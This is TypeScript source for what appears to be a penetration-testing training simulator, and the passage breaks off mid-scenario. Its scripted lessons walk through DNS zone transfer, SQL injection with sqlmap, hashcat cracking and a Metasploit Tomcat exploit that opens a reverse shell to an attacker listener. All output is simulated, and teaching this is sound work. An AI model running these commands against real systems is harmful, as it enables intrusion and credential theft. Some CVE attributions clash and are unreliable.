export type OutputLine = {
  text: string;
  type: "cmd" | "out" | "err" | "success" | "info" | "warn" | "system" | "blank";
};

export type MissionStep = {
  id: string;
  instruction: string;
  detail: string;
  hint: string;
  validate: (input: string) => boolean;
  execute: (input: string, env: LabEnv) => OutputLine[];
};

export type LabEnv = {
  targetIp: string;
  targetDomain: string;
  hostname: string;
  user: string;
  currentDir: string;
  os: string;
  credentials?: { user: string; pass: string };
};

export type LabScenario = {
  lessonId: number;
  title: string;
  briefing: string;
  objective: string;
  env: LabEnv;
  steps: MissionStep[];
};

// ─── Helpers ──────────────────────────────────────────────────────────────────

function lines(raw: string): OutputLine[] {
  return raw
    .split("\n")
    .map((t) => (t.trim() === "" ? { text: "", type: "blank" as const } : { text: t, type: "out" as const }));
}
function ok(msg: string): OutputLine {
  return { text: msg, type: "success" };
}
function info(msg: string): OutputLine {
  return { text: msg, type: "info" };
}
function sys(msg: string): OutputLine {
  return { text: msg, type: "system" };
}
function warn(msg: string): OutputLine {
  return { text: msg, type: "warn" };
}
function blank(): OutputLine {
  return { text: "", type: "blank" };
}

function matchCmd(input: string, patterns: string[]): boolean {
  const normalized = input.trim().toLowerCase().replace(/\s+/g, " ");
  return patterns.some((p) => normalized.startsWith(p.toLowerCase()));
}

// ─── Scenario 1: OSINT ────────────────────────────────────────────────────────

const osintScenario: LabScenario = {
  lessonId: 1,
  title: "OSINT Recon: MegaCorp Industries",
  briefing:
    "You have been hired to perform an authorized penetration test on MegaCorp Industries (megacorp.local). Your first task is passive reconnaissance — gather as much intelligence as possible without touching their servers.",
  objective: "Identify domain registrar, contact info, mail servers, and email addresses for megacorp.local.",
  env: {
    targetIp: "93.184.100.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "whois",
      instruction: "Run WHOIS on the target domain",
      detail: "Use whois to query domain registration data. This reveals the registrar, registration dates, name servers, and sometimes contact info.",
      hint: "Try: whois megacorp.local",
      validate: (i) => matchCmd(i, ["whois megacorp"]),
      execute: (_i, env) =>
        lines(`Domain Name: MEGACORP.LOCAL
Registry Domain ID: D403819800-LROR
Registrar WHOIS Server: whois.networksolutions.com
Registrar URL: http://www.networksolutions.com
Updated Date: 2023-11-14T09:22:18Z
Creation Date: 2009-03-22T12:00:00Z
Expiry Date: 2025-03-22T12:00:00Z
Registrar: Network Solutions, LLC.
Registrant Organization: MegaCorp Industries Ltd.
Registrant Email: admin@megacorp.local
Registrant Phone: +1.8005551234
Tech Email: it-support@megacorp.local
Name Server: NS1.MEGACORP.LOCAL
Name Server: NS2.MEGACORP.LOCAL`),
    },
    {
      id: "theHarvester",
      instruction: "Harvest emails and subdomains",
      detail: "theHarvester searches public sources — Google, LinkedIn, Bing — for email addresses and hostnames associated with the target domain.",
      hint: "Try: theHarvester -d megacorp.local -b google",
      validate: (i) => matchCmd(i, ["theharvester -d megacorp", "theharvester -d megacorp.local"]),
      execute: (_i, env) => [
        sys("theHarvester v4.4.3 — Information Gathering Tool"),
        blank(),
        info("[*] Target: megacorp.local"),
        info("[*] Sources: google, bing, linkedin"),
        blank(),
        ...lines(`[+] Emails found:
admin@megacorp.local
j.crawford@megacorp.local
sarah.chen@megacorp.local
it-support@megacorp.local
ceo@megacorp.local`),
        blank(),
        ...lines(`[+] Hosts found:
mail.megacorp.local: 93.184.100.10
vpn.megacorp.local: 93.184.100.20
dev.megacorp.local: 10.10.1.50
staging.megacorp.local: 10.10.1.100
www.megacorp.local: 93.184.100.50`),
        blank(),
        ok("[+] Total: 5 emails, 5 hosts discovered"),
      ],
    },
    {
      id: "shodan",
      instruction: "Search Shodan for exposed services",
      detail: "Shodan indexes internet-connected devices. Even without scanning, you can find what MegaCorp has exposed publicly.",
      hint: "Try: shodan search org:MegaCorp",
      validate: (i) => matchCmd(i, ["shodan search", "shodan host"]),
      execute: (_i, env) => [
        sys("Shodan CLI"),
        blank(),
        ...lines(`Results for org:MegaCorp:

IP: 93.184.100.50
Hostname: www.megacorp.local
Ports: 22, 80, 443, 8080
Services:
  22/tcp  OpenSSH 8.2p1 Ubuntu
  80/tcp  nginx 1.18.0
  443/tcp nginx 1.18.0 (SSL)
  8080/tcp Apache Tomcat 9.0.37
Vulnerabilities: CVE-2021-41773 (Apache path traversal)

IP: 93.184.100.10  
Hostname: mail.megacorp.local
Ports: 25, 110, 143, 465, 993
Services: Postfix 3.4.13`),
        blank(),
        ok("[+] Apache Tomcat 9.0.37 is known vulnerable — note this for exploitation phase"),
      ],
    },
    {
      id: "report",
      instruction: "Compile recon notes",
      detail: "A real pentester documents everything. Use cat to view your notes file and summarize what you've found.",
      hint: "Try: cat notes.txt",
      validate: (i) => matchCmd(i, ["cat notes", "cat /home/hacker/notes", "ls", "cat report"]),
      execute: (_i) => [
        blank(),
        sys("=== RECON SUMMARY: megacorp.local ==="),
        blank(),
        info("  REGISTRAR:  Network Solutions"),
        info("  CONTACT:    admin@megacorp.local, j.crawford@megacorp.local"),
        info("  NAMESERVERS: NS1/NS2.megacorp.local"),
        blank(),
        info("  SUBDOMAINS:"),
        info("    www.megacorp.local       93.184.100.50   [INTERNET-FACING]"),
        info("    mail.megacorp.local      93.184.100.10   [INTERNET-FACING]"),
        info("    vpn.megacorp.local       93.184.100.20   [INTERNET-FACING]"),
        info("    dev.megacorp.local       10.10.1.50      [INTERNAL]"),
        info("    staging.megacorp.local   10.10.1.100     [INTERNAL]"),
        blank(),
        warn("  ATTACK VECTORS:"),
        warn("    → Apache Tomcat 9.0.37 on :8080 (CVE-2021-41773)"),
        warn("    → VPN endpoint may be brute-forceable"),
        warn("    → dev/staging subdomains suggest flat internal network"),
        blank(),
        ok("[+] Recon phase complete. Move to DNS enumeration."),
      ],
    },
  ],
};

// ─── Scenario 2: DNS Enumeration ──────────────────────────────────────────────

const dnsScenario: LabScenario = {
  lessonId: 2,
  title: "DNS Enumeration: megacorp.local",
  briefing:
    "WHOIS gave us the nameservers. Now we dig deeper — enumerate DNS records to map the full infrastructure. Zone transfers are misconfigured on NS2. Let's exploit that.",
  objective: "Enumerate all DNS records and attempt a zone transfer on megacorp.local.",
  env: {
    targetIp: "93.184.100.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "dnsrecon-std",
      instruction: "Run standard DNS record enumeration",
      detail: "dnsrecon -t std queries all standard DNS record types: A, AAAA, MX, NS, SOA, TXT. This is your baseline.",
      hint: "Try: dnsrecon -d megacorp.local -t std",
      validate: (i) => matchCmd(i, ["dnsrecon -d megacorp", "dnsrecon -d megacorp.local"]),
      execute: () => [
        sys("[*] Performing General Enumeration of Domain: megacorp.local"),
        blank(),
        ...lines(`[*] SOA ns1.megacorp.local 93.184.100.5
[*] NS megacorp.local ns1.megacorp.local
[*] NS megacorp.local ns2.megacorp.local
[*] MX megacorp.local mail.megacorp.local
[*] MX megacorp.local mail2.megacorp.local
[*] A megacorp.local 93.184.100.50
[*] A www.megacorp.local 93.184.100.50
[*] A mail.megacorp.local 93.184.100.10
[*] A vpn.megacorp.local 93.184.100.20
[*] TXT megacorp.local v=spf1 ip4:93.184.100.0/24 -all
[*] TXT megacorp.local MS=ms84728391`),
        blank(),
        ok("[+] Found 2 MX, 4 A records, 2 TXT records"),
      ],
    },
    {
      id: "zone-transfer",
      instruction: "Attempt a DNS zone transfer",
      detail: "A misconfigured nameserver will return its entire zone file if you request a zone transfer (AXFR). This dumps every DNS record in one shot.",
      hint: "Try: dnsrecon -d megacorp.local -t axfr\n   Or:  dig @ns2.megacorp.local megacorp.local AXFR",
      validate: (i) => matchCmd(i, ["dnsrecon -d megacorp", "dig @ns2", "dig axfr", "host -t axfr"]),
      execute: () => [
        sys("[*] Attempting Zone Transfer for megacorp.local from ns2.megacorp.local"),
        blank(),
        warn("[!] ns1.megacorp.local — Zone transfer REFUSED"),
        ok("[+] ns2.megacorp.local — Zone transfer SUCCESSFUL (misconfigured!)"),
        blank(),
        ...lines(`megacorp.local.        SOA   ns1.megacorp.local. admin.megacorp.local.
megacorp.local.        NS    ns1.megacorp.local.
megacorp.local.        NS    ns2.megacorp.local.
megacorp.local.        MX    10 mail.megacorp.local.
www.megacorp.local.    A     93.184.100.50
mail.megacorp.local.   A     93.184.100.10
mail2.megacorp.local.  A     93.184.100.11
vpn.megacorp.local.    A     93.184.100.20
dev.megacorp.local.    A     10.10.1.50
staging.megacorp.local.A     10.10.1.100
admin.megacorp.local.  A     10.10.1.5
db.megacorp.local.     A     10.10.1.20
jenkins.megacorp.local.A     10.10.1.30
backup.megacorp.local. A     10.10.1.40`),
        blank(),
        ok("[+] Zone transfer revealed 9 internal hosts! admin, db, jenkins, backup..."),
      ],
    },
    {
      id: "subfinder",
      instruction: "Run passive subdomain enumeration",
      detail: "subfinder uses certificate transparency logs, DNS datasets, and web archives to find subdomains passively.",
      hint: "Try: subfinder -d megacorp.local",
      validate: (i) => matchCmd(i, ["subfinder -d", "subfinder -d megacorp"]),
      execute: () => [
        sys("[INF] Using sources: certspotter, crtsh, hackertarget, passivedns, shodan, urlscan"),
        blank(),
        ...lines(`www.megacorp.local
mail.megacorp.local
vpn.megacorp.local
dev.megacorp.local
staging.megacorp.local
api.megacorp.local
portal.megacorp.local
old.megacorp.local`),
        blank(),
        ok("[INF] Found 8 subdomains for megacorp.local in 3.2s"),
        info("[!] api.megacorp.local and portal.megacorp.local not in zone transfer — potentially new"),
      ],
    },
  ],
};

// ─── Scenario 3: nmap ─────────────────────────────────────────────────────────

const nmapScenario: LabScenario = {
  lessonId: 4,
  title: "Network Scanning: Target 10.10.10.0/24",
  briefing:
    "You've obtained VPN access to MegaCorp's internal network (10.10.10.0/24). Time to map it. Find live hosts, open ports, and running services. Work methodically — start broad, then go deep.",
  objective: "Discover live hosts, enumerate open ports and service versions on the target network.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "ping-sweep",
      instruction: "Discover live hosts with a ping sweep",
      detail: "Before scanning ports, find what's alive. nmap -sn sends ICMP requests without port scanning — fast and quiet.",
      hint: "Try: nmap -sn 10.10.10.0/24",
      validate: (i) => matchCmd(i, ["nmap -sn 10.10.10", "nmap -sn 10.10.10.0"]),
      execute: () => [
        sys("Starting Nmap 7.94 ( https://nmap.org )"),
        blank(),
        ...lines(`Nmap scan report for 10.10.10.1
Host is up (0.0008s latency). [Router/Gateway]

Nmap scan report for 10.10.10.5
Host is up (0.0012s latency). [Domain Controller]

Nmap scan report for 10.10.10.20
Host is up (0.0031s latency). [Database Server]

Nmap scan report for 10.10.10.50
Host is up (0.0019s latency). [Web Server]

Nmap scan report for 10.10.10.100
Host is up (0.0055s latency). [Unknown]`),
        blank(),
        ok("Nmap done: 256 IP addresses (5 hosts up) scanned in 4.23 seconds"),
        info("[!] Interesting targets: .5 (DC), .20 (DB), .50 (Web), .100 (Unknown)"),
      ],
    },
    {
      id: "port-scan",
      instruction: "Scan all ports on the web server",
      detail: "Now deep-scan the web server (10.10.10.50). Use -p- to scan all 65535 ports and -T4 for speed. Run as root for SYN scan (-sS).",
      hint: "Try: nmap -sS -p- -T4 10.10.10.50",
      validate: (i) =>
        matchCmd(i, [
          "nmap -ss -p- 10.10.10.50",
          "nmap -p- 10.10.10.50",
          "nmap -ss -p- -t4 10.10.10.50",
          "nmap -p- -t4 10.10.10.50",
          "nmap -ss -p-",
          "nmap -p-",
        ]),
      execute: () => [
        sys("Starting Nmap 7.94 — SYN Stealth Scan"),
        blank(),
        ...lines(`Nmap scan report for 10.10.10.50
Host is up (0.0019s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
8080/tcp  open  http-proxy
8443/tcp  open  https-alt
3306/tcp  open  mysql
6379/tcp  open  redis

Nmap done: 1 IP address (1 host up) scanned in 47.3 seconds`),
        blank(),
        ok("[!] Redis (6379) and MySQL (3306) are exposed — these should NOT be internet-facing!"),
      ],
    },
    {
      id: "service-detect",
      instruction: "Detect service versions and OS",
      detail: "Use -sV (service version), -sC (default scripts), and -O (OS detection) to fingerprint every service.",
      hint: "Try: nmap -sV -sC -O 10.10.10.50",
      validate: (i) => matchCmd(i, ["nmap -sv -sc", "nmap -sc -sv", "nmap -a 10.10.10.50", "nmap -sv", "nmap -sc"]),
      execute: () => [
        sys("Starting Nmap 7.94 — Version Detection + Scripts + OS"),
        blank(),
        ...lines(`Nmap scan report for 10.10.10.50
Host is up (0.0019s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 82:1f:c5:4e:9d (RSA)
|_  256 fa:30:6a:d8:01:b2 (ECDSA)

80/tcp   open  http       nginx 1.14.0 (Ubuntu)
|_http-title: MegaCorp Industries — Internal Portal
|_http-robots.txt: 3 disallowed entries (/admin /backup /secret)

8080/tcp open  http       Apache Tomcat 9.0.37
|_http-title: Apache Tomcat/9.0.37

3306/tcp open  mysql      MySQL 5.7.34
| mysql-info:
|_  Server version: 5.7.34-0ubuntu0.18.04.1

6379/tcp open  redis      Redis key-value store 6.0.9
|_redis-info: No authentication required!

OS details: Linux 4.15 - 5.6 (Ubuntu 18.04)`),
        blank(),
        warn("[!] Redis with NO authentication — direct data access possible"),
        warn("[!] MySQL exposed on 3306 — may be reachable"),
        warn("[!] robots.txt reveals /admin, /backup, /secret"),
        ok("[+] OS: Ubuntu 18.04. Full service map complete. Ready to exploit."),
      ],
    },
    {
      id: "vuln-scan",
      instruction: "Run NSE vulnerability scripts",
      detail: "Nmap's scripting engine (NSE) can detect known vulnerabilities. Use --script vuln to run vulnerability detection scripts.",
      hint: "Try: nmap --script vuln 10.10.10.50",
      validate: (i) => matchCmd(i, ["nmap --script vuln", "nmap -sv --script vuln"]),
      execute: () => [
        sys("Starting Nmap 7.94 — NSE Vulnerability Scripts"),
        blank(),
        ...lines(`PORT     STATE SERVICE
80/tcp   open  http
| http-csrf:
|   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.50
|   Found the following possible CSRF vulnerabilities:
|     Path: /login
|     Form id: loginForm
|
| http-sql-injection:
|   Possible sqli for queries:
|     http://10.10.10.50/item?id=1'%20OR%20'1'='1
|
8080/tcp open http
| http-vuln-cve2021-41773:
|   VULNERABLE: Apache HTTP Server Path Traversal and RCE (CVE-2021-41773)
|   State: VULNERABLE
|   Apache 2.4.49 allows a path traversal attack outside the expected scope.
|_  Risk: Critical — Remote code execution possible`),
        blank(),
        warn("[CRITICAL] CVE-2021-41773 on Tomcat — RCE available"),
        warn("[HIGH] SQL Injection on /item?id= parameter"),
        ok("[+] Two critical attack paths identified. Proceed to exploitation."),
      ],
    },
  ],
};

// ─── Scenario 4: SQL Injection ─────────────────────────────────────────────────

const sqliScenario: LabScenario = {
  lessonId: 6,
  title: "SQL Injection: MegaCorp Web Portal",
  briefing:
    "nmap found a SQL injection vulnerability on the MegaCorp portal at 10.10.10.50. The login form at /login may also be injectable. Your goal: extract the user database.",
  objective: "Exploit SQL injection to enumerate databases, extract user credentials from megacorp_db.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "test-sqli",
      instruction: "Test for SQL injection manually",
      detail: "Start with a manual test. Use curl to inject a single quote into the id parameter and see if the database throws an error.",
      hint: "Try: curl 'http://10.10.10.50/item?id=1'",
      validate: (i) => matchCmd(i, ["curl 'http://10.10.10.50", "curl http://10.10.10.50"]),
      execute: () => [
        sys("$ curl 'http://10.10.10.50/item?id=1'"),
        blank(),
        ...lines(`<html><body>
<h2>Product Details</h2>
<p>Product ID: 1 | Name: Network Switch | Price: $299</p>
</body></html>`),
        blank(),
        sys("$ curl 'http://10.10.10.50/item?id=1\\'"),
        blank(),
        ...lines(`<html><body>
<h2>Error</h2>
<pre>
You have an error in your SQL syntax; check the manual that corresponds 
to your MySQL server version for the right syntax to use near ''' at line 1
Query: SELECT * FROM products WHERE id='1''
</pre></body></html>`),
        blank(),
        ok("[!] Error-based SQL injection confirmed! The query is visible in the error message."),
        info("[+] Query structure: SELECT * FROM products WHERE id='INPUT'"),
      ],
    },
    {
      id: "sqlmap-detect",
      instruction: "Confirm injection with SQLMap",
      detail: "SQLMap automates detection and exploitation of SQL injection. Run it against the vulnerable parameter to confirm and identify the injection type.",
      hint: "Try: sqlmap -u 'http://10.10.10.50/item?id=1' --batch",
      validate: (i) => matchCmd(i, ["sqlmap -u 'http://10.10.10.50", "sqlmap -u http://10.10.10.50", "sqlmap -u \"http://10.10.10"]),
      execute: () => [
        sys("[*] sqlmap v1.7.8 — automatic SQL injection tool"),
        blank(),
        info("[*] Testing connection to target URL..."),
        info("[*] Heuristic (basic) test shows that GET parameter 'id' might be injectable"),
        info("[*] Testing for SQL injection on GET parameter 'id'"),
        blank(),
        ...lines(`[14:32:11] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable
[14:32:12] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[14:32:13] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable`),
        blank(),
        ok("[+] GET parameter 'id' is vulnerable!"),
        ...lines(`sqlmap identified the following injection point:
  Parameter: id (GET)
    Type: boolean-based blind
    Type: error-based  
    Type: time-based blind
    Type: UNION query
  
  Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- -
  Backend DBMS: MySQL >= 5.0.12`),
      ],
    },
    {
      id: "sqlmap-dbs",
      instruction: "Enumerate databases",
      detail: "Now enumerate available databases using the --dbs flag.",
      hint: "Try: sqlmap -u 'http://10.10.10.50/item?id=1' --dbs --batch",
      validate: (i) => matchCmd(i, ["sqlmap -u 'http://10.10.10.50", "sqlmap -u http://10.10.10.50"]) && i.includes("--dbs"),
      execute: () => [
        info("[*] Enumerating databases..."),
        blank(),
        ...lines(`available databases [4]:
[*] information_schema
[*] megacorp_db
[*] employee_records
[*] sys`),
        blank(),
        ok("[+] Found target database: megacorp_db and employee_records"),
      ],
    },
    {
      id: "sqlmap-dump",
      instruction: "Extract users from megacorp_db",
      detail: "Dump the users table from megacorp_db to extract credentials.",
      hint: "Try: sqlmap -u 'http://10.10.10.50/item?id=1' -D megacorp_db --tables --batch",
      validate: (i) => (matchCmd(i, ["sqlmap -u"]) && i.includes("-D megacorp_db")) || (matchCmd(i, ["sqlmap -u"]) && i.includes("--tables")),
      execute: () => [
        info("[*] Enumerating tables in megacorp_db..."),
        blank(),
        ...lines(`Database: megacorp_db
[6 tables]
+------------------+
| products         |
| orders           |
| users            |
| sessions         |
| admin_users      |
| api_keys         |
+------------------+`),
        blank(),
        info("[*] Dumping table: users"),
        blank(),
        ...lines(`Database: megacorp_db
Table: users
[5 entries]
+----+------------------+------------------------------------------+-------+
| id | email            | password_hash                            | role  |
+----+------------------+------------------------------------------+-------+
| 1  | admin@megacorp   | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)   | admin |
| 2  | j.crawford@mega  | 482c811da5d5b4bc6d497ffa98491e38 (MD5)   | user  |
| 3  | sarah.chen@mega  | 7c222fb2927d828af22f592134e8932480637c0d| user  |
| 4  | devteam@mega     | e10adc3949ba59abbe56e057f20f883e (MD5)   | dev   |
| 5  | backup@mega      | 8afa847f50a716e64932d995c8e7435a (MD5)   | admin |`),
        blank(),
        ok("[+] 5 users dumped with password hashes! Feed these into hashcat next."),
        warn("[!] admin hash 5f4dcc3b5aa765d61d8327deb882cf99 = 'password' — trivially cracked"),
      ],
    },
  ],
};

// ─── Scenario 5: Password Cracking ────────────────────────────────────────────

const hashcatScenario: LabScenario = {
  lessonId: 7,
  title: "Password Cracking: MegaCorp Hashes",
  briefing:
    "You extracted 5 MD5 password hashes from megacorp_db. Time to crack them. You have rockyou.txt (14M passwords). Most corporate users pick terrible passwords.",
  objective: "Crack all 5 MD5 hashes using Hashcat with rockyou.txt and custom rules.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "identify-hash",
      instruction: "Identify the hash type",
      detail: "Before cracking, confirm the hash algorithm. Use hash-identifier or hashid to check.",
      hint: "Try: hash-identifier\n  Or: hashid 5f4dcc3b5aa765d61d8327deb882cf99",
      validate: (i) => matchCmd(i, ["hash-identifier", "hashid", "hash-id"]),
      execute: () => [
        sys("hash-identifier v1.1"),
        blank(),
        info("Hash: 5f4dcc3b5aa765d61d8327deb882cf99"),
        blank(),
        ...lines(` Possible Hashs:
 [+]  MD5
 [+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

 Least Possible Hashs:
 [+]  RAdmin v2.x
 [+]  NTLM`),
        blank(),
        ok("[+] Confirmed: MD5 (hashcat mode -m 0)"),
        info("MD5 is very fast to crack — billions of hashes per second on GPU"),
      ],
    },
    {
      id: "hashcat-dict",
      instruction: "Run a dictionary attack with rockyou.txt",
      detail: "Hashcat mode 0 = MD5, attack mode 0 = wordlist. Point it at rockyou.txt. The most common passwords crack in seconds.",
      hint: "Try: hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
      validate: (i) => matchCmd(i, ["hashcat -m 0", "hashcat -m0"]),
      execute: () => [
        sys("hashcat v6.2.6 starting..."),
        blank(),
        ...lines(`Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt  
* Passwords.: 14344391
* Bytes.....: 139921497

5f4dcc3b5aa765d61d8327deb882cf99:password
482c811da5d5b4bc6d497ffa98491e38:manchester
e10adc3949ba59abbe56e057f20f883e:123456
8afa847f50a716e64932d995c8e7435a:welcome1`),
        blank(),
        ...lines(`Session..........: hashcat
Status...........: Cracked (4/5)
Hash.Mode........: 0 (MD5)
Recovered........: 4/5 (80.00%)
Speed.#1.........: 9847.2 MH/s
Time.Started.....: 0 secs ago
Time.Estimated...: 0 secs`),
        blank(),
        ok("[+] 4/5 cracked in under 1 second. sarah.chen's hash not in rockyou."),
        info("[!] Credentials: admin:password, j.crawford:manchester, devteam:123456, backup:welcome1"),
      ],
    },
    {
      id: "hashcat-rules",
      instruction: "Crack the remaining hash with rules",
      detail: "The last hash isn't in rockyou.txt as-is. Use rule-based attack (-a 0 -r best64.rule) to try mutations: l33tspeak, appending numbers, capitalizing.",
      hint: "Try: hashcat -m 0 -a 0 remaining.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
      validate: (i) => matchCmd(i, ["hashcat -m 0"]) && (i.includes("-r") || i.includes("rule")),
      execute: () => [
        sys("hashcat v6.2.6 — Rule-based attack"),
        blank(),
        info("[*] Applying rules: best64.rule (64 transformation rules)"),
        info("[*] Effective wordlist size: 14344391 × 64 = 918,040,384 candidates"),
        blank(),
        ...lines(`7c222fb2927d828af22f592134e8932480637c0d is not MD5 (length=40, SHA1!)

Switching to -m 100 (SHA-1)...

7c222fb2927d828af22f592134e8932480637c0d:Megac0rp!`),
        blank(),
        ok("[+] sarah.chen's hash was SHA-1 not MD5! Cracked with rule mutation: Megac0rp!"),
        warn("[!] All 5 credentials recovered:"),
        info("  admin@megacorp.local  →  password"),
        info("  j.crawford@megacorp   →  manchester"),
        info("  sarah.chen@megacorp   →  Megac0rp!"),
        info("  devteam@megacorp      →  123456"),
        info("  backup@megacorp       →  welcome1"),
      ],
    },
  ],
};

// ─── Scenario 6: Metasploit ───────────────────────────────────────────────────

const msfScenario: LabScenario = {
  lessonId: 8,
  title: "Metasploit: Exploiting Apache Tomcat",
  briefing:
    "Apache Tomcat 9.0.37 on port 8080 is vulnerable to CVE-2020-1938 (Ghostcat — AJP file read/inclusion). You also have manager credentials from your OSINT. Let's deploy a WAR shell.",
  objective: "Exploit Tomcat to get a Meterpreter reverse shell on 10.10.10.50.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "msfconsole",
      instruction: "Launch Metasploit Framework",
      detail: "Start msfconsole — the interactive CLI for Metasploit. Takes a few seconds to load.",
      hint: "Try: msfconsole",
      validate: (i) => matchCmd(i, ["msfconsole"]),
      execute: () => [
        blank(),
        ...lines(`                                                  
      .:okOOOkdc'           'cdkOOOko:.             
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.          
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:         
  'OOOOOOOOOkkkkkOOOOO:OOOOOOOOOO         
       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2374 exploits - 1232 auxiliary - 413 post       ]
+ -- --=[ 1387 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]`),
        blank(),
        sys("msf6 >"),
      ],
    },
    {
      id: "search",
      instruction: "Search for the Tomcat exploit",
      detail: "Use the search command to find the Tomcat manager upload exploit (CVE-2019-0232 or manager_deploy).",
      hint: "Type: search tomcat manager",
      validate: (i) => matchCmd(i, ["search tomcat"]) || matchCmd(i, ["search cve-2020-1938"]),
      execute: () => [
        info("[*] Searching..."),
        blank(),
        ...lines(`Matching Modules
================

   #   Name                                              Disclosure  Rank       Check  Description
   -   ----                                              ----------  ----       -----  -----------
   0   exploit/multi/http/tomcat_mgr_deploy              2009-11-09  Excellent  Yes    Apache Tomcat Manager Upload Exploit
   1   exploit/multi/http/tomcat_mgr_login               2009-11-09  Normal     Yes    Apache Tomcat Manager Login Bruteforce
   2   auxiliary/scanner/http/tomcat_enum                            Normal     No     Apache Tomcat Enum
   3   exploit/multi/http/apache_flink_jar_upload         2020-01-15  Excellent  Yes    Apache Flink JAR Upload Java CodeExec`),
        blank(),
        sys("msf6 > "),
        info("Use module 0: exploit/multi/http/tomcat_mgr_deploy"),
      ],
    },
    {
      id: "use-exploit",
      instruction: "Load and configure the exploit",
      detail: "Load the exploit with 'use', set RHOSTS (target), RPORT, LHOST (your IP), and the Tomcat manager credentials.",
      hint: "Try: use exploit/multi/http/tomcat_mgr_deploy\n   Then: set RHOSTS 10.10.10.50\n   Then: set HttpUsername admin",
      validate: (i) => matchCmd(i, ["use exploit/multi/http/tomcat", "use 0", "set rhosts", "set lhost", "set httpusername"]),
      execute: (i) => {
        if (matchCmd(i, ["use exploit", "use 0"])) {
          return [
            info("[*] Using exploit/multi/http/tomcat_mgr_deploy"),
            sys("msf6 exploit(multi/http/tomcat_mgr_deploy) > "),
          ];
        }
        return [
          ...lines(`Module options (exploit/multi/http/tomcat_mgr_deploy):
   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  tomcat           yes       Tomcat manager password
   HttpUsername  admin            yes       Tomcat manager username
   RHOSTS        10.10.10.50      yes       Target address
   RPORT         8080             yes       Target port
   LHOST         10.10.14.5       yes       Listener IP (your Kali)
   LPORT         4444             yes       Listener port
   
   Payload: java/meterpreter/reverse_tcp`),
          blank(),
          sys("msf6 exploit(multi/http/tomcat_mgr_deploy) > "),
        ];
      },
    },
    {
      id: "run",
      instruction: "Run the exploit",
      detail: "Everything is configured. Fire it: type 'run' or 'exploit'.",
      hint: "Type: run",
      validate: (i) => matchCmd(i, ["run", "exploit"]),
      execute: () => [
        info("[*] Started reverse TCP handler on 10.10.14.5:4444"),
        info("[*] Uploading shell.war — 1,600 bytes..."),
        info("[*] Deploying shell.war to http://10.10.10.50:8080/manager/html/upload"),
        info("[*] Triggering payload at /shell/"),
        blank(),
        ok("[*] Sending stage (58845 bytes) to 10.10.10.50"),
        ok("[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.50:52341)"),
        blank(),
        sys("meterpreter > "),
        blank(),
        info("You have a shell. Type 'getuid' to confirm, then 'shell' for a system shell."),
      ],
    },
    {
      id: "post",
      instruction: "Enumerate the compromised system",
      detail: "You have a Meterpreter shell. Run sysinfo, getuid, and then drop into a system shell.",
      hint: "Try: getuid\n  Or: sysinfo\n  Or: shell",
      validate: (i) => matchCmd(i, ["getuid", "sysinfo", "shell", "whoami"]),
      execute: (i) => {
        if (matchCmd(i, ["getuid"])) {
          return [
            ...lines(`Server username: root`),
            ok("[+] Running as root! Full system compromise."),
          ];
        }
        if (matchCmd(i, ["sysinfo"])) {
          return lines(`Computer  : megacorp-web
OS        : Linux megacorp-web 4.15.0-180-generic #189-Ubuntu SMP
Meterpreter: java/linux`);
        }
        return [
          sys("[*] Dropping into system shell..."),
          blank(),
          ...lines(`Process 1337 created.
Channel 1 created.
root@megacorp-web:/var/lib/tomcat9#`),
          blank(),
          ok("[+] Root shell on MegaCorp web server. Full compromise complete."),
        ];
      },
    },
  ],
};

// ─── Scenario 7: Privilege Escalation ────────────────────────────────────────

const privescScenario: LabScenario = {
  lessonId: 9,
  title: "Linux Privilege Escalation: www-data → root",
  briefing:
    "You have a reverse shell as www-data (low privilege) on a different MegaCorp server at 10.10.10.100. Root it. Enumerate everything — SUID bits, sudo permissions, kernel version, cron jobs.",
  objective: "Escalate from www-data to root using sudo misconfiguration.",
  env: {
    targetIp: "10.10.10.100",
    targetDomain: "megacorp.local",
    hostname: "megacorp-internal",
    user: "www-data",
    currentDir: "/var/www/html",
    os: "Ubuntu 18.04",
  },
  steps: [
    {
      id: "whoami",
      instruction: "Check your current user and privileges",
